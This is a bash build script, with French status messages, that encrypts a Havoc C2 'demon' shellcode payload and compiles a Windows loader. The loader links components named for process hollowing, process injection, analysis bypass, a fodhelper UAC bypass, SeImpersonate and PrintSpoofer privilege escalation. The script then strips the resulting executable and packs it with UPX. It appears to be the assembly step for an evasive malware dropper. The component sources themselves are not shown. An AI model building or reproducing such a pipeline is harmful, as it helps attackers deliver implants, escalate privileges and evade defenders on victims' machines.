#!/bin/bash
set -euo pipefail

echo ""
echo "=================================================="
echo "   AES Encryption - demon.x64.h"
echo "=================================================="
echo ""

INPUT_BIN="$1"
OUTPUT_EXE="$2"
ARCH="${3:-x64}"

[[ $# -lt 2 ]] && { echo "usage: $0 demon.x64.bin havoc_loader.exe [x64|x86]"; exit 1; }

# Cleanup
[[ -f "$OUTPUT_EXE" ]] && { rm -f "$OUTPUT_EXE"; echo "[*] Suppression: $OUTPUT_EXE"; } || echo "[*] $OUTPUT_EXE inexistant"
[[ -f "demon.x64.h" ]] && { rm -f "demon.x64.h"; echo "[*] Suppression: demon.x64.h"; } || echo "[*] demon.x64.h inexistant"
rm -f *.o
echo "[*] Nettoyage: fichiers objet supprimés"

python3 myenc.py -i "$INPUT_BIN"
grep -q "fodhelper_enc" demon.x64.h || { echo "❌ fodhelper_enc manquant"; exit 1; }

CC="x86_64-w64-mingw32-g++"
CC_C="x86_64-w64-mingw32-gcc"
STUB_DEFINE="-D_M_AMD64"
if [[ "$ARCH" == "x86" ]]; then
  CC="i686-w64-mingw32-g++"
  CC_C="i686-w64-mingw32-gcc"
  STUB_DEFINE="-D_X86_"
fi

# Compile RPC stubs (C file) - must be compiled with proper flags
echo "[*] Compiling RPC stubs..."
# MIDL output gates code on _M_AMD64, so define it for mingw-w64 x64
$CC_C -c -O2 -fPIC $STUB_DEFINE ms-rprn_c.c -o printspoofer_rpc.o
# Provide MIDL alloc/bind helpers expected by generated stubs
$CC_C -c -O2 -fPIC rpc_helpers.c -o rpc_helpers.o

# Compile all C++ files including RPC trigger
# NOTE: RPC object file must come AFTER the C++ files to resolve symbols properly
$CC -O2 -s -static -static-libgcc -static-libstdc++ \
  loader.cpp easCipher42.cpp crypto_funcs.cpp process_hollower.cpp process_injection.cpp bypass_analysis.cpp uac_bypass.cpp seimpersonate.cpp printspoofer_trigger.cpp \
  printspoofer_rpc.o rpc_helpers.o \
  -lbcrypt -lntdll -lole32 -lwinhttp -lrpcrt4 -luserenv -o "$OUTPUT_EXE"

strip "$OUTPUT_EXE" 2>/dev/null || true
upx --best "$OUTPUT_EXE" 2>/dev/null || true

echo "$(du -h "$OUTPUT_EXE" | cut -f1) ✅"
